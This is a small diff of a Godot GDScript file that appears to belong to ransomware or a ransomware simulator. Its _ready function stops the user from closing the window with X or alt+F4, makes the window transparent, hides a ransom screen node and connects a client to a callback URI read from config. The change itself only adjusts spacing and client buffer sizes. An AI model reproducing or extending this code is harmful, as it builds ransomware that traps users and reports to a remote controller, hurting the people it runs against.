@@ -27,7 +27,6 @@ func _ready():
 	get_tree().set_auto_accept_quit(false) # Don't let users click X or alt+F4
 	get_tree().get_root().set_transparent_background(true) # transparent background?
 
-
 	$ransom.hide()
 	
 	_client.connect("connection_closed", self, "_closed")
@@ -39,6 +38,8 @@ func _ready():
 	$CallbackTimer.wait_time = $config.get_callback_wait_time()
 	
 	print("$CallbackTimer.wait_time: ", $CallbackTimer.wait_time)
+	
+	_client.set_buffers(1024, 1024, 1024, 1024)
 
 	var err = _client.connect_to_url($config.get_callback_uri(), [], false, $config.get_headers())
 
